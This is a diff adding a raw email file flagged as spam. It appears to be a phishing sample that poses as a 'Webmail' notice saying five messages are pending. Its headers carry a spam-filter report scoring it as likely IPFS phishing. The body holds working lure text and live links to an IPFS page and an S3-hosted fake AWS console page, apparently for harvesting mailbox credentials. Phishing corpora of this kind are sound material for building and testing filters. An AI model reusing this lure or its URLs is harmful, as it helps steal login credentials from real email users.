@@ -1,0 +1,134 @@
+Return-Path: <sales@c3-could.fit>
+Delivered-To: info+spam@go-onriders.com
+Received: from rin6.dizinc.com
+	by rin6.dizinc.com with LMTP
+	id uC0/Oufx+2heayQAQ+45pw
+	(envelope-from <sales@c3-could.fit>)
+	for <info+spam@go-onriders.com>; Fri, 24 Oct 2025 17:38:47 -0400
+Return-path: <sales@c3-could.fit>
+Envelope-to: info@go-onriders.com
+Delivery-date: Fri, 24 Oct 2025 17:38:48 -0400
+Received: from c3-could.fit ([188.132.141.51]:44727)
+	by rin6.dizinc.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.98.2)
+	(envelope-from <sales@c3-could.fit>)
+	id 1vCPUn-0000000A0yJ-16NZ
+	for info@go-onriders.com;
+	Fri, 24 Oct 2025 17:38:47 -0400
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=c3-could.fit;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=sales@c3-could.fit;
+ bh=oV5hpX2ZH04LHMLuIcfYq3PyaSI=;
+ b=kA00rpzjNHMI+oGlM7dETvg2+yeDM72hhTSPTNPGdHyAwFmo4dBUv3+ModFGfaCMPGbfNyLdrzh5
+   PSqPkCctzko49yrBDcANPV2b65NW/k510loZuaLXMVooZCKKq0nFtzU+b1CFd0bETud52ubnzSff
+   25gm0mCa2s/g/F6xJTI=
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=default; d=c3-could.fit;
+ b=UtLlaUqJtlZeKUqrJYGOq4vSMDNbrdSucLFvRvxp0hUGdJYie06M4FmEQbBegAPdhQwigLnKqnVK
+   YviPye3aKt4wtQ/WYlZX97g2kgoMMb/Y0VK+Q8DGtLJoR1W2Z3GM+n4wJXmK0S0xKWn6ghQPDxu3
+   JoN8T4ubJaou/bIhDWA=;
+From: Mail Notification <sales@c3-could.fit>
+To: info@go-onriders.com
+Date: 25 Oct 2025 05:38:01 +0800
+Message-ID: <20251025053800.C7C2B7B173BCBEB1@c3-could.fit>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-MagicSpam-TUUID: 816160c6-fe8d-4d64-8fdf-0728f5710ae9
+X-MagicSpam-SUUID: be72269e-2e88-4e28-9772-b1eb41c25a7a
+X-Spam-Status: Yes, score=22.7
+X-Spam-Score: 227
+X-Spam-Bar: ++++++++++++++++++++++
+X-Spam-Report: =?ISO-8859-1?Q?Spam_detection_software=2C_running_on_the_system_=22rin6=2Edizinc=2Ec?= =?ISO-8859-1?Q?om=22=2C=0A_has_identified_this_incoming_email_as_pos?= =?ISO-8859-1?Q?sible_spam=2E__The_original=0A_message_has_been_attac?= =?ISO-8859-1?Q?hed_to_this_so_you_can_view_it_or_label=0A_similar_fu?= =?ISO-8859-1?Q?ture_email=2E__If_you_have_any_questions=2C_see=0A_ro?= =?ISO-8859-1?Q?ot=5C=40localhost_for_details=2E=0A_Content_preview=3A_?= =?ISO-8859-1?Q?_Webmail_Dear_=5B_info=40go-onriders=2Ecom_=5D=2C_=0A_?= =?ISO-8859-1?Q?Content_analysis_details=3A___=2822=2E7_points=2C_5=2E0?= =?ISO-8859-1?Q?_required=29=0A__pts_rule_name______________descripti?= =?ISO-8859-1?Q?on=0A_----_----------------------_-------------------?= =?ISO-8859-1?Q?-------------------------------=0A__0=2E0_URIBL=5FBLO?= =?ISO-8859-1?Q?CKED__________ADMINISTRATOR_NOTICE=3A_The_query_to_UR?= =?ISO-8859-1?Q?IBL_was_blocked=2E=0A_____________________________See?= =?ISO-8859-1?Q?=0A_____________________________http=3A//wiki=2Eapach?= =?ISO-8859-1?Q?e=2Eorg/spamassassin/DnsBlocklists#dnsbl-block=0A____?= =?ISO-8859-1?Q?__________________________for_more_information=2E=0A_?= =?ISO-8859-1?Q?____________________________=5BURI=3A_ipfs=2Eio=5D=0A?= =?ISO-8859-1?Q?_____________________________=5BURI=3A_amazonaws=2Eco?= =?ISO-8859-1?Q?m=5D=0A__0=2E0_RCVD=5FIN=5FVALIDITY=5FSAFE=5FBLOCKED_?= =?ISO-8859-1?Q?RBL=3A_ADMINISTRATOR_NOTICE=3A_The_query_to=0A_______?= =?ISO-8859-1?Q?_______________________Validity_was_blocked=2E__See=0A_?= =?ISO-8859-1?Q?____________________________https=3A//knowledge=2Eval?= =?ISO-8859-1?Q?idity=2Ecom/hc/en-us/articles/20961730681243=0A______?= =?ISO-8859-1?Q?________________________for_more_information=2E=0A___?= =?ISO-8859-1?Q?__________________________=5B188=2E132=2E141=2E51_lis?= =?ISO-8859-1?Q?ted_in_sa-accredit=2Ehabeas=2Ecom=5D=0A__0=2E0_RCVD=5FI?= =?ISO-8859-1?Q?N=5FVALIDITY=5FRPBL=5FBLOCKED_RBL=3A_ADMINISTRATOR_NO?= =?ISO-8859-1?Q?TICE=3A_The_query_to=0A______________________________?= =?ISO-8859-1?Q?Validity_was_blocked=2E__See=0A______________________?= =?ISO-8859-1?Q?_______https=3A//knowledge=2Evalidity=2Ecom/hc/en-us/?= =?ISO-8859-1?Q?articles/20961730681243=0A___________________________?= =?ISO-8859-1?Q?___for_more_information=2E=0A________________________?= =?ISO-8859-1?Q?____=5B188=2E132=2E141=2E51_listed_in_bl=2Escore=2Ese?= =?ISO-8859-1?Q?nderscore=2Ecom=5D=0A__0=2E0_RCVD=5FIN=5FVALIDITY=5FC?= =?ISO-8859-1?Q?ERTIFIED=5FBLOCKED_RBL=3A_ADMINISTRATOR_NOTICE=3A_The?= =?ISO-8859-1?Q?=0A_____________________________query_to_Validity_was?= =?ISO-8859-1?Q?_blocked=2E__See=0A_____________________________https?= =?ISO-8859-1?Q?=3A//knowledge=2Evalidity=2Ecom/hc/en-us/articles/209?= =?ISO-8859-1?Q?61730681243=0A______________________________for_more_?= =?ISO-8859-1?Q?information=2E=0A_________________________=5B188=2E13?= =?ISO-8859-1?Q?2=2E141=2E51_listed_in_sa-trusted=2Ebondedsender=2Eor?= =?ISO-8859-1?Q?g=5D=0A_-0=2E0_SPF=5FHELO=5FPASS__________SPF=3A_HELO?= =?ISO-8859-1?Q?_matches_SPF_record=0A_-0=2E0_SPF=5FPASS_____________?= =?ISO-8859-1?Q?__SPF=3A_sender_matches_SPF_record=0A_-0=2E1_DKIM=5FV?= =?ISO-8859-1?Q?ALID=5FAU__________Message_has_a_valid_DKIM_or_DK_sig?= =?ISO-8859-1?Q?nature_from_author's=0A_____________________________d?= =?ISO-8859-1?Q?omain=0A__0=2E1_DKIM=5FSIGNED____________Message_has_?= =?ISO-8859-1?Q?a_DKIM_or_DK_signature=2C_not_necessarily_valid=0A_-0?= =?ISO-8859-1?Q?=2E1_DKIM=5FVALID=5FEF__________Message_has_a_valid_D?= =?ISO-8859-1?Q?KIM_or_DK_signature_from=0A__________________________?= =?ISO-8859-1?Q?___envelope-from_domain=0A_-0=2E1_DKIM=5FVALID_______?= =?ISO-8859-1?Q?______Message_has_at_least_one_valid_DKIM_or_DK_signa?= =?ISO-8859-1?Q?ture=0A__0=2E3_FROM=5FFMBLA=5FNEWDOM______From_domain?= =?ISO-8859-1?Q?_was_registered_in_last_7_days=0A__1=2E1_PDS=5FOTHER=5FB?= =?ISO-8859-1?Q?AD=5FTLD______Untrustworthy_TLDs=0A__________________?= =?ISO-8859-1?Q?___________=5BURI=3A_c3-could=2Efit_=28fit=29=5D=0A__?= =?ISO-8859-1?Q?0=2E1_MIME=5FHTML=5FONLY_________BODY=3A_Message_only?= =?ISO-8859-1?Q?_has_text/html_MIME_parts=0A__0=2E0_HTML=5FMESSAGE___?= =?ISO-8859-1?Q?________BODY=3A_HTML_included_in_message=0A__0=2E0_MX?= =?ISO-8859-1?Q?G=5FEMAIL=5FFRAG_________BODY=3A_URI_with_email_in_fr?= =?ISO-8859-1?Q?agment=0A__0=2E0_HTML=5FFONT=5FSIZE=5FHUGE____BODY=3A_?= =?ISO-8859-1?Q?HTML_font_size_is_huge=0A__0=2E9_URI=5FIPFSIO________?= =?ISO-8859-1?Q?_____References_Interplanetary_File_System_PtP_conten?= =?ISO-8859-1?Q?t_via=0A_____________________________ipfs=2Eio=2C_lik?= =?ISO-8859-1?Q?ely_phishing=0A__0=2E5_FROM=5FSUSPICIOUS=5FNTLD___Fro?= =?ISO-8859-1?Q?m_abused_NTLD=0A__0=2E0_KAM=5FSHORT______________Use_?= =?ISO-8859-1?Q?of_a_URL_Shortener_for_very_short_URL=0A___18_KAM=5FI?= =?ISO-8859-1?Q?PFS_______________Abused_Protocol_for_Distributed_Con?= =?ISO-8859-1?Q?tent=0A__2=2E0_FROM=5FSUSPICIOUS=5FNTLD=5FFP_From_abu?= =?ISO-8859-1?Q?sed_NTLD=0A__0=2E0_URI=5FIPFS_______________Reference?= =?ISO-8859-1?Q?s_Interplanetary_File_System_PtP_content=2C_probable=0A_?= =?ISO-8859-1?Q?____________________________phishing?=
+X-Spam-Flag: YES
+Subject:  ***SPAM***  =?UTF-8?B?4pyJWW91IGhhdmUgKDUpIE1haWxzIFBlbmRpbmcgISA=?=
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;"><div dir=3D"ltr"><div dir=3D"ltr">
+<div id=3D"m_-7182329784198433732m_6165215058821770595gmail-message-htmlpar=
+t1">
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; padding-top: 0px; font-family: Arial,Helvetica,s=
+ans-serif; font-size: small; font-style: normal; font-weight: 400; word-spa=
+cing: 0px; border-top-color: currentColor; border-top-width: 0px; border-to=
+p-style: none; white-space: normal; box-sizing: border-box; background-colo=
+r: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: n=
+ormal; text-decoration-style: initial;=20
+text-decoration-color: initial;" dir=3D"ltr"><span style=3D"color: rgb(249,=
+ 83, 22); font-family: Roboto,sans-serif; font-size: xx-large; font-weight:=
+ bolder; box-sizing: border-box;"><font size=3D"7">Webmail</font></span></d=
+iv>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial,Helvetica,sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; box-sizing: border-box; background-color: rgb(255, 255, 255);=
+ font-variant-ligatures: normal; font-variant-caps: normal; text-decoration=
+-style: initial; text-decoration-color: initial;" dir=3D"ltr">
+<span style=3D'color: rgb(51, 51, 51); font-family: sans-serif,Arial,Verdan=
+a,"Trebuchet MS"; font-size: 13px; box-sizing: border-box;'>Dear&nbsp;</spa=
+n>[ info@go-onriders.com ]<span style=3D'color: rgb(51, 51, 51); font-famil=
+y: sans-serif,Arial,Verdana,"Trebuchet MS"; font-size: 13px; box-sizing: bo=
+rder-box;'>,</span></div>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial,Helvetica,sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; box-sizing: border-box; background-color: rgb(255, 255, 255);=
+ font-variant-ligatures: normal; font-variant-caps: normal; text-decoration=
+-style: initial; text-decoration-color: initial;" dir=3D"ltr">
+<div style=3D"padding-top: 0px; border-top-color: currentColor; border-top-=
+width: 0px; border-top-style: none; box-sizing: border-box;"><div style=3D"=
+padding-top: 0px; border-top-color: currentColor; border-top-width: 0px; bo=
+rder-top-style: none; box-sizing: border-box;" dir=3D"ltr"><div style=3D"pa=
+dding-top: 0px; border-top-color: currentColor; border-top-width: 0px; bord=
+er-top-style: none; box-sizing: border-box;">
+<div style=3D"padding-top: 0px; border-top-color: currentColor; border-top-=
+width: 0px; border-top-style: none; box-sizing: border-box;" dir=3D"ltr"><d=
+iv style=3D"padding-top: 0px; font-family: verdana,sans-serif; border-top-c=
+olor: currentColor; border-top-width: 0px; border-top-style: none; box-sizi=
+ng: border-box;"><p style=3D'color: rgb(51, 51, 51); font-family: sans-seri=
+f,Arial,Verdana,"Trebuchet MS"; font-size: 13px; margin-top: 0px; margin-bo=
+ttom: 0px; box-sizing: border-box;'>&nbsp;</p>
+<p style=3D'color: rgb(51, 51, 51); font-family: sans-serif,Arial,Verdana,"=
+Trebuchet MS"; font-size: 13px; margin-top: 0px; margin-bottom: 0px; box-si=
+zing: border-box;'>You have 5 mails pending .</p><p style=3D'color: rgb(51,=
+ 51, 51); font-family: sans-serif,Arial,Verdana,"Trebuchet MS"; font-size: =
+13px; margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;'>&nbsp;<=
+/p>
+<p style=3D'color: rgb(51, 51, 51); font-family: sans-serif,Arial,Verdana,"=
+Trebuchet MS"; font-size: 13px; margin-top: 0px; margin-bottom: 0px; box-si=
+zing: border-box;'>Follow the link below to release all to your inbox.</p><=
+p style=3D'color: rgb(51, 51, 51); font-family: sans-serif,Arial,Verdana,"T=
+rebuchet MS"; font-size: 13px; margin-top: 0px; margin-bottom: 0px; box-siz=
+ing: border-box;'>&nbsp;</p><p style=3D"color: rgb(44, 54, 58); margin-top:=
+ 0px; box-sizing: border-box;">
+<span style=3D"font-family: tahoma,sans-serif; box-sizing: border-box;">
+<a style=3D"color: rgb(0, 172, 255); box-sizing: border-box; background-col=
+or: transparent; text-decoration-line: none;" href=3D"https://ipfs.io/ipfs/=
+bafybeihnezjld5w3ozzj6ixnuqbkwj7bie6bpyuyvnr3yfiuvututlwgfy/web.html#info@g=
+o-onriders.com" target=3D"_blank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://www.e-click.=
+jp/redirects/direct/10087/1637/?url%3Dhttps://s3.eu-west-1.amazonaws.com/sa=
+-south-3.console.aws.amazon.com003/panell.html%23%5B%5B-Email-%5D%5D&amp;so=
+urce=3Dgmail&amp;ust=3D1761421369676000&amp;usg=3DAOvVaw0NwLiILFsua4AD06ID3=
+3Z1"> <font size=3D"4">Release message to inbox</font></a></span></p>
+<p style=3D'color: rgb(51, 51, 51); font-family: sans-serif,Arial,Verdana,"=
+Trebuchet MS"; font-size: 13px; margin-top: 0px; margin-bottom: 0px; box-si=
+zing: border-box;'>&nbsp;</p>
+<p style=3D'color: rgb(51, 51, 51); font-family: sans-serif,Arial,Verdana,"=
+Trebuchet MS"; font-size: 13px; margin-top: 0px; margin-bottom: 0px; box-si=
+zing: border-box;'>Thanks</p><p style=3D'color: rgb(51, 51, 51); font-famil=
+y: sans-serif,Arial,Verdana,"Trebuchet MS"; font-size: 13px; margin-top: 0p=
+x; margin-bottom: 0px; box-sizing: border-box;'>&amp; Regards</p>
+<p style=3D'color: rgb(51, 51, 51); font-family: sans-serif,Arial,Verdana,"=
+Trebuchet MS"; font-size: 13px; margin-top: 0px; margin-bottom: 0px; box-si=
+zing: border-box;'>&nbsp;</p><p style=3D'color: rgb(51, 51, 51); font-famil=
+y: sans-serif,Arial,Verdana,"Trebuchet MS"; font-size: 13px; margin-top: 0p=
+x; margin-bottom: 0px; box-sizing: border-box;'>Source:&nbsp;[ info@go-onri=
+ders.com ]&nbsp;Admin Service @2025.</p></div></div></div></div></div></div=
+></div>
+
+<br></div>
+</div>
+</body></html>
